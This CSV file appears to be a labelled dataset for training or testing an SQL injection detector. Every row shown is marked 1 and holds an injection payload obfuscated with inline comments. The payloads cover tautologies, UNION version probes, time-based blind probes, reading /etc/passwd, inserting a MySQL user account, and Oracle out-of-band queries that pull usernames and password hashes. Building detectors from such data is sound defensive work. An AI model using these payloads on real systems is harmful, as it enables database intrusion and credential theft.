Query,Label
"o/**/r 1  =  1 o/**/r """"  =  ",1
/**/o/**/r/**/1/**/  =  /**/1,1
" sele/**/ct * f/**/rom users w/**/here id  =  1 o/**/r "".  (  "" o/**/r 1  =  1 -- 1",1
" selec/**/t * fro/**/m users wher/**/e id  =  '1' u/**/nion sele/**/ct ||/1,version  (    )   -- 1'",1
" s/**/elect * fr/**/om users wh/**/ere id  =  '1' un/**/ion s/**/elect +\.,@@VERSION -- 1'",1
o/**/r 1  =  1/*,1
%27 o/**/r 1  =  1,1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 <@&@ uni/**/on selec/**/t 1,version  (    )   -- 1",1
" s/**/elect * fr/**/om users wher/**/e id  =  '1' un/**/ion selec/**/t $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
" sele/**/ct * fr/**/om users whe/**/re id  =  '1' o/**/r $ 1  =  1 unio/**/n s/**/elect 1,@@VERSION -- 1'",1
s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r \.<1 o/**/r 1  =  1 -- 1,1
" se/**/lect * fro/**/m users whe/**/re id  =  '1' o/**/r \<\ un/**/ion sel/**/ect 1,@@VERSION -- 1'",1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 unio/**/n selec/**/t 1||1,version  (    )   -- 1",1
" selec/**/t * f/**/rom users w/**/here id  =  1 ||1 un/**/ion s/**/elect n/**/ull,banner fro/**/m v$version wher/**/e rownum  =  1 -- 1",1
s/**/elect * fr/**/om users wher/**/e id  =  '1' o/**/r \.<\ o/**/r 1  =  1 -- 1',1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r ""]{"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r "".@"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users wher/**/e id  =  1 o/**/r ""$["" o/**/r 1  =  1 -- 1",1
o/**/r 1 --',1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r "",;"" o/**/r 1  =  1 -- 1",1
"admi/**/n"" o/**/r 1  =  1#",1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 +  (  1  )   u/**/nion sele/**/ct nu/**/ll,banner fro/**/m v$version whe/**/re rownum  =  1 -- 1",1
\x27UNI/**/ON SEL/**/ECT,1
PRI/**/NT,1
" se/**/lect * f/**/rom users wher/**/e id  =  '1' u/**/nion s/**/elect   (  \.  )  ,@@VERSION -- 1'",1
o/**/r 1  =  1--,1
1 o/**/r pg_sleep  (  __TIME__  )  --,1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r "",#"" o/**/r 1  =  1 -- 1",1
admi/**/n'  )   o/**/r   (  '1'  =  '1'/*,1
o/**/r 2 betwe/**/en 1 a/**/nd 3,1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 o/**/r ""  )  .""  =  1 o/**/r 1  =  1 -- 1",1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r 1#"". unio/**/n s/**/elect n/**/ull,version  (    )   -- 1",1
admi/**/n' o/**/r '1'  =  '1,1
; if no/**/t  (  selec/**/t system_user  )   <> 'sa' waitfo/**/r delay '0:0:2' --,1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 unio/**/n s/**/elect 1,banner fro/**/m v$version wh/**/ere rownum  =  1 -- 1",1
""" o/**/r 0  =  0 --",1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 u/**/nion sel/**/ect @ $_,version  (    )   -- 1",1
s/**/elect * fr/**/om users wher/**/e id  =  1 <@.$ o/**/r 1  =  1 -- 1,1
" s/**/elect * f/**/rom users wher/**/e id  =  1 o/**/r ""%."" o/**/r 1  =  1 -- 1",1
" se/**/lect * f/**/rom users whe/**/re id  =  1 + $+*$ u/**/nion se/**/lect nul/**/l,@@VERSION -- 1",1
" s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r "",."" o/**/r 1  =  1 -- 1",1
char%4039%41%2b%40SE/**/LECT,1
" sele/**/ct * fro/**/m users wh/**/ere id  =  1 o/**/r ""1&"" o/**/r 1  =  1 -- 1",1
admi/**/n'  )   o/**/r   (  '1'  =  '1,1
declare @s varchar   (  200  )   sele/**/ct @s   =   0x73656c6 ...,1
"o/**/r 0  =  0 #""",1
" sele/**/ct * fr/**/om users wh/**/ere id  =  1 o/**/r "".]"" o/**/r 1  =  1 -- 1",1
  )   o/**/r   (  'x'  =  'x,1
" selec/**/t * fr/**/om users wh/**/ere id  =  1.<@$ u/**/nion se/**/lect 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 *1 unio/**/n sel/**/ect n/**/ull,banner f/**/rom v$version w/**/here rownum  =  1 -- 1",1
"1 u/**/nion all s/**/elect 1,2,3,4,5,6,name fro/**/m sysobjects wher/**/e xtype   =   'u' --",1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r 1#"". unio/**/n s/**/elect 'a',version  (    )   -- 1",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r 1#""; uni/**/on selec/**/t nul/**/l,version  (    )   -- 1",1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r 1#""? o/**/r 1  =  1 -- 1",1
"""a"""" o/**/r 1  =  1--""",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 *1 unio/**/n s/**/elect 1,banner fro/**/m v$version wher/**/e rownum  =  1 -- 1",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  column_name  )   F/**/ROM   (  SE/**/LECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T FRO/**/M all_tab_columns  )   WHER/**/E LIMI/**/T  =  4   )    )    AN/**/D 'i'  =  'i",1
" sel/**/ect * fr/**/om users w/**/here id  =  '1' u/**/nion s/**/elect   (  \  )  ,@@VERSION -- 1'",1
1 an/**/d user_name  (    )     =   'dbo',1
"; if no/**/t  (  substri/**/ng   (    (   sel/**/ect @@version  )  ,24,1  )   <> 1  )   waitfo/**/r delay '0:0:2' --",1
" se/**/lect * fro/**/m users wher/**/e id  =  1 o/**/r 1#""$ uni/**/on selec/**/t 1,version  (    )   -- 1",1
" sel/**/ect * f/**/rom users wh/**/ere id  =  1 o/**/r 1#""{ un/**/ion selec/**/t n/**/ull,version  (    )   -- 1",1
se/**/lect * fr/**/om users wh/**/ere id  =  '1' *$ . o/**/r 1  =  1 -- 1',1
sel/**/ect * fro/**/m users w/**/here id  =  1 +$+. o/**/r 1  =  1 -- 1,1
se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r   (  \+  )    =  1 o/**/r 1  =  1 -- 1,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  USERNAME  )   FR/**/OM   (  SELEC/**/T DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS LIMI/**/T FRO/**/M SYS.ALL_USERS  )   WHE/**/RE LIM/**/IT  =  6   )    )    A/**/ND 'i'  =  'i",1
o/**/r 1  =  1 o/**/r ''  =  ',1
sel/**/ect * fro/**/m users wh/**/ere id  =  1   o/**/r 1  =  1 -- 1,1
o/**/r 'text' > 't',1
"1234 "" AN/**/D 1  =  0 U/**/NION ALL SELEC/**/T ""admi/**/n"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" se/**/lect * f/**/rom users w/**/here id  =  1 o/**/r ""%["" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r 1#"";  =  1 uni/**/on sele/**/ct 1,version  (    )   -- 1",1
admi/**/n' o/**/r '1'  =  '1'#,1
s/**/elect * fr/**/om users whe/**/re id  =  1 +$ 1 o/**/r 1  =  1 -- 1,1
s,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  USERNAME  )   F/**/ROM   (  SELEC/**/T DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS LIMI/**/T F/**/ROM SYS.ALL_USERS  )   W/**/HERE LIM/**/IT  =  4   )    )    A/**/ND 'i'  =  'i",1
 sel/**/ect * fr/**/om i/**/nfo/**/rmation_schema.ta/**/bles--,1
" se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""$&"" o/**/r 1  =  1 -- 1",1
1   )    )    o/**/r pg_sleep  (  __TIME__  )  --,1
" s/**/elect * fro/**/m users w/**/here id  =  '1' u/**/nion sel/**/ect !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   s/**/elect @q   =   0x770061 ...,1
 o/**/r 1  =  1 o/**/r ''  =  ',1
s/**/elect * fro/**/m users whe/**/re id  =  1 %!<1 o/**/r 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   sele/**/ct @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r ""]1"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users wh/**/ere id  =  1 o/**/r $+<1 unio/**/n sele/**/ct 1,@@VERSION -- 1",1
o/**/r 'unusual'   =   'unusual',1
 o/**/r 1 i/**/n   (  se/**/lect @@version  )  --,1
truncat/**/e,1
as,1
 o/**/r 3  =  3 --,1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 ||1 uni/**/on selec/**/t 1,banner fro/**/m v$version wher/**/e rownum  =  1 -- 1",1
" sele/**/ct * f/**/rom users w/**/here id  =  1 <@$$ uni/**/on s/**/elect 1,version  (    )   -- 1",1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1",1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 o/**/r 1#""@ uni/**/on s/**/elect 'a',version  (    )   -- 1",1
"1  )   o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
" s/**/elect * fr/**/om users wher/**/e id  =  1 uni/**/on selec/**/t .1_,version  (    )   -- 1",1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT SYS.DATABA/**/SE_NAME F/**/ROM DUAL   )    )    AN/**/D 'i'  =  'i,1
" o/**/r 0  =  0 #""",1
sele/**/ct * fr/**/om users wh/**/ere id  =  1 %$ 1 o/**/r 1  =  1 -- 1,1
se/**/lect * fro/**/m users whe/**/re id  =  1 %!<@ o/**/r 1  =  1 -- 1,1
"; if n/**/ot  (  substri/**/ng   (    (   sele/**/ct @@version  )  ,25,1  )   <> 0  )   waitfo/**/r delay '0:0:2' --",1
1  )   o/**/r sleep  (  __TIME__  )  #,1
" se/**/lect * f/**/rom users whe/**/re id  =  1 o/**/r ""1_"" o/**/r 1  =  1 -- 1",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 <1## un/**/ion se/**/lect 1,version  (    )   -- 1",1
" se/**/lect * f/**/rom users w/**/here id  =  1 + $+*\ u/**/nion s/**/elect nul/**/l,@@VERSION -- 1",1
sel/**/ect * f/**/rom users w/**/here id  =  1. <@ o/**/r 1  =  1 -- 1,1
 o/**/r true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' o/**/r 'x'  =  'x';,1
s/**/elect * f/**/rom users wher/**/e id  =  1 <@ o/**/r 1  =  1 -- 1,1
" sel/**/ect * fro/**/m users wher/**/e id  =  1 o/**/r "".,"" o/**/r 1  =  1 -- 1",1
admi/**/n' #,1
" sele/**/ct * f/**/rom users w/**/here id  =  1 <@$_ u/**/nion sele/**/ct 1,version  (    )   -- 1",1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r "",  (  "" o/**/r 1  =  1 -- 1",1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 o/**/r "",{"" o/**/r 1  =  1 -- 1",1
" u/**/nion sel/**/ect 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitfo/**/r delay '0:0:__TIME__'--",1
 o/**/r 'unusual'   =   'unusual',1
"i/**/n/**/sert i/**/nt/**/o mysql.user   (  user, host, passwo/**/rd  )   value/**/s   (  'name', 'localhost', passwo/**/rd  (  'pass123'   )    )   ",1
"admi/**/n"" o/**/r ""1""  =  ""1""/*",1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 o/**/r ""1  (  ""  =  1 o/**/r 1  =  1 -- 1",1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 o/**/r \<1 uni/**/on se/**/lect 1,@@VERSION -- 1",1
lik/**/e,1
o/**/r username li/**/ke char  (  37  )  ;,1
 )    )    o/**/r pg_sleep  (  __TIME__  )  --,1
sele/**/ct * fr/**/om users whe/**/re id  =  1 o/**/r $+<\ o/**/r 1  =  1 -- 1,1
o/**/r 3  =  3,1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 o/**/r ""  (  ."" o/**/r 1  =  1 -- 1",1
selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r   (  $+  )    =  1 o/**/r 1  =  1 -- 1,1
exec sp,1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r \+<$ uni/**/on se/**/lect 1,@@VERSION -- 1",1
sel/**/ect * f/**/rom users w/**/here id  =  1 o/**/r \<$ o/**/r 1  =  1 -- 1,1
" sel/**/ect * fro/**/m users wher/**/e id  =  1.&&1 u/**/nion se/**/lect 1,version  (    )   -- 1",1
admi/**/n' o/**/r 1  =  1/*,1
a' waitfo/**/r delay '0:0:10'--,1
" sele/**/ct * fr/**/om users w/**/here id  =  1 +  (  \  )   u/**/nion selec/**/t n/**/ull,@@VERSION -- 1",1
" sele/**/ct * fr/**/om users wh/**/ere id  =  1 uni/**/on sele/**/ct .1$_,version  (    )   -- 1",1
an/**/d 1 i/**/n   (  sel/**/ect var f/**/rom temp  )  --,1
hi'  )   o/**/r   (  'a'  =  'a,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  column_name  )   F/**/ROM   (  S/**/ELECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIM/**/IT FRO/**/M all_tab_columns  )   WHER/**/E LI/**/MIT  =  1   )    )    A/**/ND 'i'  =  'i",1
"admi/**/n"" o/**/r 1  =  1",1
"""  )   o/**/r true--",1
" s/**/elect * fro/**/m users whe/**/re id  =  '1' o/**/r $ .  =  1 unio/**/n s/**/elect 1,@@VERSION -- 1'",1
" s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r ""  (  {"" o/**/r 1  =  1 -- 1",1
1  )   o/**/r pg_sleep  (  __TIME__  )  --,1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r ""{."" o/**/r 1  =  1 -- 1",1
"""  )   o/**/r sleep  (  __TIME__  )    =  """,1
sele/**/ct * fro/**/m users wh/**/ere id  =  1.<@. o/**/r 1  =  1 -- 1,1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1""--",1
" sele/**/ct * f/**/rom users wher/**/e id  =  1<@.. un/**/ion s/**/elect 1,version  (    )   -- 1",1
; exec xp_regread,1
" se/**/lect * f/**/rom users wher/**/e id  =  '1' + @ 1 unio/**/n sel/**/ect 1,version  (    )   -- 1'",1
s/**/elect * fr/**/om users whe/**/re id  =  1 + \+%1 o/**/r 1  =  1 -- 1,1
" s/**/elect * f/**/rom users whe/**/re id  =  1 o/**/r "";1"" o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 o/**/r ""%&"" o/**/r 1  =  1 -- 1",1
1 an/**/d 1  =  1,1
o/**/r 0  =  0 #,1
unio/**/n sele/**/ct * fr/**/om users whe/**/re logi/**/n   =   char ...,1
" sel/**/ect * fro/**/m users w/**/here id  =  1 unio/**/n s/**/elect 1||@,version  (    )   -- 1",1
admi/**/n'  )   o/**/r '1'  =  '1'--,1
1;S/**/ELECT *,1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 o/**/r ""{;"" o/**/r 1  =  1 -- 1",1
x' an/**/d 1  =    (  s/**/elect count  (  *  )   fro/**/m tabname  )  ; --,1
" sele/**/ct * fr/**/om users w/**/here id  =  '1' o/**/r """"<@ unio/**/n s/**/elect 1,version  (    )   -- 1'",1
" selec/**/t * fr/**/om users wh/**/ere id  =  1 o/**/r ""?,"" o/**/r 1  =  1 -- 1",1
" se/**/lect * fro/**/m users wher/**/e id  =  '1' ||1 u/**/nion selec/**/t 1,banner fro/**/m v$version w/**/here rownum  =  1 -- 1'",1
"1 o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
o/**/r ''  =  ',1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T SYS.LOGI/**/N_USER F/**/ROM DUAL   )    )    AN/**/D 'i'  =  'i,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  USERNAME  )   F/**/ROM   (  SELE/**/CT DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS L/**/IMIT FRO/**/M SYS.ALL_USERS  )   WHE/**/RE LI/**/MIT  =  2   )    )    AN/**/D 'i'  =  'i",1
\'; de/**/sc users; --,1
" sel/**/ect * f/**/rom users w/**/here id  =  1 o/**/r   (  \.  )    =  1 u/**/nion sele/**/ct 1,@@VERSION -- 1",1
sele/**/ct * f/**/rom users wher/**/e id  =  '1' o/**/r $ 1  =  1 o/**/r 1  =  1 -- 1',1
""" o/**/r """"^""",1
"""-""",1
" s/**/elect * f/**/rom users whe/**/re id  =  1 o/**/r \<   =  1 uni/**/on s/**/elect 1,@@VERSION -- 1",1
" s/**/elect * fr/**/om users w/**/here id  =  1 uni/**/on s/**/elect 1<@$,version  (    )   -- 1",1
" sel/**/ect * fro/**/m users w/**/here id  =  1 *\ uni/**/on se/**/lect nu/**/ll,@@VERSION -- 1",1
" se/**/lect * fr/**/om users w/**/here id  =  '1' o/**/r !<@ un/**/ion sel/**/ect 1,version  (    )   -- 1'",1
" selec/**/t * f/**/rom users w/**/here id  =  1 o/**/r "".%"" o/**/r 1  =  1 -- 1",1
admi/**/n'/*,1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r ""  (  #"" o/**/r 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  tab/**/le_name  )   FR/**/OM   (  SELE/**/CT DI/**/STI/**/NCT  (  tab/**/le_name  )  , ROWNUM AS LIMI/**/T FR/**/OM sys.all_t/**/ables  )   W/**/HERE LI/**/MIT  =  1   )    )    A/**/ND 'i'  =  'i",1
" sel/**/ect * f/**/rom users wher/**/e id  =  '1'<@.. unio/**/n s/**/elect 1,version  (    )   -- 1'",1
"""   )    )    o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 <@.$ un/**/ion selec/**/t 1,version  (    )   -- 1",1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 o/**/r $ .  =  1 uni/**/on se/**/lect 1,@@VERSION -- 1",1
s/**/elect * fr/**/om users whe/**/re id  =  '1' <@.$ o/**/r 1  =  1 -- 1',1
1 uni/**/on se/**/lect all f/**/rom wh/**/ere,1
" sele/**/ct * f/**/rom users wh/**/ere id  =  1 +$ . un/**/ion s/**/elect n/**/ull,@@VERSION -- 1",1
" selec/**/t * fr/**/om users w/**/here id  =  1 o/**/r 1#""? u/**/nion sel/**/ect nul/**/l,version  (    )   -- 1",1
admi/**/n'  )   o/**/r '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
o/**/r '7659'  =  '7659,1
" selec/**/t * fro/**/m users w/**/here id  =  1 o/**/r ""{@"" o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users w/**/here id  =  1 un/**/ion se/**/lect +!<1,version  (    )   -- 1",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  granted_role  )   F/**/ROM   (  SELE/**/CT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS L/**/IMIT FR/**/OM dba_role_privs WHER/**/E GRANTEE  =  SYS.LOGI/**/NUSER  )   WHE/**/RE L/**/IMIT  =  6   )    )    AN/**/D 'i'  =  'i",1
" se/**/lect * f/**/rom users whe/**/re id  =  1 o/**/r ""  (  @"" o/**/r 1  =  1 -- 1",1
o/**/r true--,1
" sele/**/ct * f/**/rom users whe/**/re id  =  1 un/**/ion se/**/lect !<1,version  (    )   -- 1",1
" selec/**/t * fr/**/om users w/**/here id  =  '1' uni/**/on sele/**/ct \#,@@VERSION -- 1'",1
" sele/**/ct * f/**/rom users whe/**/re id  =  1 o/**/r 1#""{ uni/**/on se/**/lect 1,version  (    )   -- 1",1
""" o/**/r true--",1
se/**/lect * fro/**/m users wher/**/e id  =  1. o/**/r 1  =  1 -- 1,1
" s/**/elect * fr/**/om users wher/**/e id  =  1 o/**/r @#"",  =  1 unio/**/n sel/**/ect 1,version  (    )   -- 1",1
" se/**/lect * fro/**/m users whe/**/re id  =  1 o/**/r "";@"" o/**/r 1  =  1 -- 1",1
â o/**/r 3  =  3 --,1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT global_name FRO/**/M global_name   )    )    AN/**/D 'i'  =  'i,1
" selec/**/t * fro/**/m users w/**/here id  =  1 +1 u/**/nion selec/**/t n/**/ull,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r "",,""  =  1 o/**/r 1  =  1 -- 1",1
" sele/**/ct * f/**/rom users wh/**/ere id  =  1 + $+%1 uni/**/on selec/**/t nu/**/ll,@@VERSION -- 1",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r 1#""? unio/**/n sel/**/ect version  (    )  ,version  (    )   -- 1",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 o/**/r ""  )  1"" o/**/r 1  =  1 -- 1",1
 o/**/r uid lik/**/e '%,1
s/**/elect * fro/**/m users wh/**/ere id  =  '1' <@&1 o/**/r 1  =  1 -- 1',1
" se/**/lect * fr/**/om users whe/**/re id  =  '1' u/**/nion selec/**/t !<1,version  (    )   -- 1'",1
23 o/**/r 1  =  1; --,1
" s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r \<\. unio/**/n sele/**/ct 1,@@VERSION -- 1",1
" s/**/elect * fro/**/m users w/**/here id  =  1 o/**/r ""{  (  ""  =  1 o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 o/**/r ""%_"" o/**/r 1  =  1 -- 1",1
selec/**/t * fr/**/om users wh/**/ere id  =  1 +   (  \.  )   o/**/r 1  =  1 -- 1,1
" selec/**/t * f/**/rom users wher/**/e id  =  '1' unio/**/n sele/**/ct \,@@VERSION -- 1'",1
0 o/**/r 1  =  1,1
sele/**/ct * fr/**/om users wher/**/e id  =  1 &@ o/**/r 1  =  1 -- 1,1
"admi/**/n""  )   o/**/r ""1""  =  ""1",1
sel/**/ect * fr/**/om users wh/**/ere id  =  1 o/**/r \<   =  1 o/**/r 1  =  1 -- 1,1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r ""??"" o/**/r 1  =  1 -- 1",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  SEL/**/ECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIMI/**/T FRO/**/M SYS.USER$  )   W/**/HERE L/**/IMIT  =  5   )    )    A/**/ND 'i'  =  'i",1
